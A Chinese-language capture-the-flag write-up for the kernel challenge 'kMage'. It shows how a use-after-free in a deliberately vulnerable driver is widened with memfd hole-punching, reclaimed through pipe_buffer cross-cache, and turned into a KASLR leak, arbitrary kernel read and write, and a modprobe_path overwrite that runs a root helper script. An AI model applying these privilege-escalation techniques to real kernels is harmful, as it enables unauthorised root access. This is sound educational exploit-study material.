# kMage Writeup

## 题目概述

kMage 是一道 kernel pwn 题。附件提供了：

```text
bzImage
rootfs.cpio.gz
run.sh
```

启动后会进入普通用户 `ctf` 的 shell，题目模块注册了 `/dev/sycmem`。题目的核心考点是：

```text
PunchHole 阻塞 copy_to_user
-> free 后 slot 仍保存 dangling pointer
-> cross-cache 回收释放页
-> pipe_buffer UAF
-> 泄露 KASLR / 构造物理读写
-> 覆盖 modprobe_path
-> request_module 执行 root helper
```

最终 exploit 见同目录下的 [exploit.c](./exploit.c)。

## 环境保护

题目运行参数大致如下：

```sh
qemu-system-x86_64 \
    -m 128M \
    -kernel ./build/bzImage \
    -initrd ./build/rootfs.cpio.gz \
    -append "console=ttyS0 rdinit=/sbin/init kaslr oops=panic panic=1 quiet" \
    -cpu qemu64,+smep,+smap \
    -smp 2 \
    -nographic \
    -monitor /dev/null \
    -no-reboot \
    -snapshot
```

rootfs 中会加载模块并开放设备：

```sh
insmod /sycmem.ko
chmod 666 /dev/sycmem
```

## 驱动接口

模块提供 4 个 ioctl：

```c
struct sycmem_req {
    u32 idx;
    u32 size;
    u64 offset;
    u64 user_buf;
    u64 sync;
};

#define SYCMEM_ALLOC _IOW(0x53, 0x10, struct sycmem_req)
#define SYCMEM_FREE  _IOW(0x53, 0x11, struct sycmem_req)
#define SYCMEM_READ  _IOWR(0x53, 0x12, struct sycmem_req)
#define SYCMEM_WRITE _IOW(0x53, 0x13, struct sycmem_req)
```

每个 slot 对应一个 0x1000 大小对象：

```c
#define SYCMEM_MAX_SLOTS 0x400
#define SYCMEM_OBJ_SIZE  0x1000

struct sycmem_slot {
    void *ptr;
    u32 size;
    bool freeing;
};
```

对象来自一个专用 cache：

```c
sycmem_area = kmem_cache_create("kmage_node", 0x1000, 0, 0, NULL);
```

这个专用 cache 是题目设计中的一个关键点。释放 sycmem 对象后，需要让 slab page 回到 buddy，再让其他 subsystem 的 0x1000 级别对象重新占用这些页，也就是 cross-cache。

## 漏洞分析

漏洞位于 `SYCMEM_FREE`。核心释放流程可以简化成：

```c
slot = &slots[req->idx];
ptr = slot->ptr;

slot->freeing = true;
atomic_inc(&sycmem_state);

kmem_cache_free(sycmem_area, ptr);
kmem_cache_shrink(sycmem_area);

if (req->sync)
    copy_to_user(req->sync, &sync_byte, 1);

slot->ptr = NULL;
slot->size = 0;
slot->freeing = false;
atomic_dec(&sycmem_state);
```

可以看到，`ptr` 已经被 `kmem_cache_free()` 释放，但 `slot->ptr` 要等到 `copy_to_user(req->sync)` 结束后才会清空。

而 `SYCMEM_READ` / `SYCMEM_WRITE` 没有拿锁，也没有检查 `slot->freeing`：

```c
ptr = READ_ONCE(slot->ptr);
slot_size = READ_ONCE(slot->size);

copy_to_user(user_buf, ptr + offset, size);
copy_from_user(ptr + offset, user_buf, size);
```

因此，只要让 `FREE` 卡在：

```text
free object done
copy_to_user(sync) not returned yet
slot->ptr not cleared yet
```

这个窗口里，其他线程就可以通过 `READ/WRITE` 使用已经释放的 dangling pointer。

还有一个设计点：

```c
if (atomic_read(&sycmem_state) || slot->ptr || slot->freeing)
    return -EBUSY;
```

只要有对象处于 freeing 状态，`ALLOC` 就会失败。这阻止了同模块直接 reclaim，迫使利用走 cross-cache。

## 为什么需要 PunchHole

普通用户态地址如果已经在页表中，`copy_to_user()` 会很快返回，UAF 窗口太短，不稳定。

题目的预期做法是让 `copy_to_user(sync)` 写入一个 shmem/memfd 映射，并在另一个线程中不断对该 memfd 做 PunchHole：

```c
fallocate(memfd, FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE, 0, size);
```

当 `copy_to_user()` 访问的用户页正好被 punch 掉，就会进入 shmem fault 路径，等待页重新建立。通过大量 alias 和多轮 punch，可以把这个 fault 放大成一个足够稳定的阻塞窗口。

exploit 中相关参数：

```c
#define PUNCH_PAGES 4096
#define PUNCH_SIZE  (PUNCH_PAGES * 0x1000)
#define SYNC_PAGE   (PUNCH_PAGES / 2)
#define SYNC_OFF    (SYNC_PAGE * 0x1000)
#define ALIASES     100000
#define PUNCH_ROUNDS 3
```

流程：

1. `memfd_create()` 创建 shmem 文件。
2. `ftruncate()` 扩展到 `PUNCH_SIZE`。
3. 映射 `SYNC_OFF` 对应页面作为 `sync_map`。
4. 子进程把同一个 memfd 的页面映射成 100000 个 alias。
5. 子进程反复 `fallocate(PUNCH_HOLE)`。
6. free 线程调用 `SYCMEM_FREE(sync=sync_map)`，卡在 `copy_to_user()`。

这样 dangling pointer 窗口可以稳定保持到 pipe_buffer 完成 reclaim。

## 堆布局和 cross-cache

利用目标选择 `pipe_buffer`。原因是：

1. `pipe_buffer` 中有 `struct page *page` 和 `ops` 指针，适合泄露地址。
2. 修改 `pipe_buffer.page/offset/len` 可以构造任意读。
3. 设置 `PIPE_BUF_FLAG_CAN_MERGE` 可以构造类似 Dirty Pipe 的写原语。
4. pipe ring 扩容时会分配接近 0x1000 的对象，适合 reclaim sycmem 释放页。

exploit 先创建带 tag 的 pipe：

```c
#define PIPE_COUNT 192
#define PIPE_SLOTS 64
#define PIPE_RING_SIZE (PIPE_SLOTS * 0x1000)
#define PIPE_LEN_BASE 0x80
```

每个 pipe 写入不同长度：

```c
len = PIPE_LEN_BASE + i;
write(pipefd[i][1], data, len);
```

这个 `len` 后面用来识别命中的 pipe 属于哪个 `pipefd[i]`。

之后：

1. 分配全部 `0x400` 个 sycmem slot。
2. 选择中间 64 个 slot 作为 victim。
3. 释放其他 slot，降低干扰。
4. 对 victim slot 启动 64 个 blocked free。
5. 在 free 被 PunchHole 阻塞后，对所有 pipe 执行：

```c
fcntl(pipefd[i][1], F_SETPIPE_SZ, PIPE_RING_SIZE);
```

pipe ring 扩容会分配新的 `pipe_buffer` 数组，从而有概率回收 sycmem 释放出来的页。

## 识别 pipe_buffer

`struct pipe_buffer` 在当前内核上的关键字段可以按下面结构解析：

```c
struct pipe_buf_view {
    u64 page;
    u32 offset;
    u32 len;
    u64 ops;
    u32 flags;
    u32 pad;
    u64 private;
};
```

exploit 用 stale `SYCMEM_READ` 扫 victim 页，寻找满足以下条件的 entry：

```text
offset == 0
flags & PIPE_BUF_FLAG_CAN_MERGE
private == 0
ops 是 kernel pointer
page 是 vmemmap 中的 struct page pointer
len >= PIPE_LEN_BASE
len - PIPE_LEN_BASE 能对应到某个 pipe index
```

命中后可以得到：

```text
slot: stale sycmem slot index
off:  pipe_buffer entry 在 0x1000 页内的偏移
pipe_idx: 具体是哪一个 pipe
page: pipe_buffer.page
ops:  anon_pipe_buf_ops 的运行时地址
```

示例输出：

```text
[+] pipe buf slot=158 off=0x0 pipe=4 page=ffffeae4400de680 ops=ffffffff892265c0
```

## KASLR 泄露

`pipe_buffer.ops` 指向 `anon_pipe_buf_ops`。已知静态符号：

```c
#define LINK_TEXT              0xffffffff81000000
#define LINK_ANON_PIPE_BUF_OPS 0xffffffff826265c0
#define LINK_MODPROBE_PATH     0xffffffff82f4ae80
```

可以通过 `System.map` 验证：

```text
ffffffff81000000 T _text
ffffffff826265c0 d anon_pipe_buf_ops
ffffffff82f4ae80 T modprobe_path
```

因此：

```c
slide = leaked_ops - LINK_ANON_PIPE_BUF_OPS;
runtime_modprobe = LINK_MODPROBE_PATH + slide;
```

`pipe_buffer.page` 是 `struct page *`，位于 vmemmap 区域。利用中用：

```c
vmemmap = leaked_page & ~(1GB - 1);
```

得到 vmemmap 基址附近的值。

## pipe_buffer 任意读

任意读通过临时修改命中的 `pipe_buffer` 完成：

```c
pb.page   = target_page;
pb.offset = target_off;
pb.len    = len;
pb.ops    = original_ops;
pb.flags  = 0;
```

然后调用：

```c
tee(pipefd[hit_pipe][0], tmp_pipe[1], len, SPLICE_F_NONBLOCK);
read(tmp_pipe[0], out, len);
```

`tee()` 会按照伪造后的 `pipe_buffer.page/offset/len` 把目标页面内容复制到另一个 pipe，再由用户态读出。

每次读完后都恢复原始 pipe_buffer：

```c
restore_pipebuf(hit);
```

这样可以减少关闭 pipe 或继续操作时触发异常的概率。

## 定位 modprobe_path 物理页

覆盖 `modprobe_path` 时，pipe_buffer 需要的是 `struct page *`，不是内核线性映射虚拟地址。因此还需要找到 kernel text 的物理加载基址。

exploit 枚举：

```c
#define PHYS_LOAD_MIN  0x1000000
#define PHYS_LOAD_MAX  0x5600000
#define PHYS_LOAD_STEP 0x200000
```

对每个候选：

```c
modprobe_delta = LINK_MODPROBE_PATH - LINK_TEXT;
phys = phys_load + modprobe_delta;
page = vmemmap + ((phys >> 12) * sizeof(struct page));
off  = runtime_modprobe & 0xfff;
```

然后用 pipe_buffer 任意读读取该页对应偏移。如果读到：

```text
/sbin/modprobe
```

说明候选物理基址正确。

示例输出：

```text
[.] slide=0000000006c00000 vmemmap=ffffeae440000000 modprobe=ffffffff89b4ae80
[+] phys_load=4a00000 target_page=ffffeae4401a5280 off=0xe80
```

## pipe_buffer 任意写

写 `modprobe_path` 使用 `PIPE_BUF_FLAG_CAN_MERGE`。

把命中的 pipe_buffer 改成：

```c
pb.page   = target_page;
pb.offset = target_off - 1;
pb.len    = 1;
pb.flags  = PIPE_BUF_FLAG_CAN_MERGE;
pb.ops    = original_ops;
```

随后：

```c
write(pipefd[hit_pipe][1], "/home/ctf/x", sizeof("/home/ctf/x"));
```

因为 pipe buffer 允许 merge，新写入数据会追加到：

```text
offset + len == target_off
```

从而覆盖 `modprobe_path` 为 `/home/ctf/x`。

写完后再用任意读验证：

```text
[.] loader path now: /home/ctf/x
[+] updated loader path
```

## 触发 request_module

先在用户目录写 root helper：

```sh
#!/bin/sh
/bin/echo ok > /home/ctf/done
/bin/chmod 777 /flag 2>/dev/null
/bin/cp /flag /home/ctf/out 2>/dev/null
/bin/chmod 777 /home/ctf/out 2>/dev/null
```

路径是：

```text
/home/ctf/x
```

覆盖 `modprobe_path` 后，通过尝试创建一批 socket family 触发 `request_module()`：

```c
for (family = 3; family < 46; family++)
    socket(family, SOCK_STREAM, 0);
```

内核会执行新的 modprobe helper，即 `/home/ctf/x`。helper 以 root 身份运行，修改 `/flag` 权限或复制到 `/home/ctf/out`。最后 exploit 读取：

```text
/flag
/home/ctf/out
/home/ctf/done
```

本地无真实 flag 时会输出：

```text
ok
```

## Exploit 流程总结

完整流程如下：

```text
1. 创建 /home/ctf/x root helper
2. memfd_create + 大量 alias，准备 PunchHole helper
3. 创建 192 个 pipe，并用不同 len 打 tag
4. 分配 0x400 个 sycmem object
5. 保留 64 个 victim，释放其他 spare object
6. 对 64 个 victim 执行 SYCMEM_FREE(sync=shmem page)
7. PunchHole 阻塞 copy_to_user，形成 dangling pointer
8. F_SETPIPE_SZ 扩容 pipe ring，让 pipe_buffer 数组 reclaim freed page
9. stale read 扫描 pipe_buffer
10. 泄露 anon_pipe_buf_ops，计算 KASLR slide
11. 由 pipe_buffer.page 推 vmemmap
12. 枚举 kernel physical load，任意读定位 modprobe_path
13. CAN_MERGE 写 modprobe_path = /home/ctf/x
14. socket() 触发 request_module()
15. 读取 flag/out/done
```
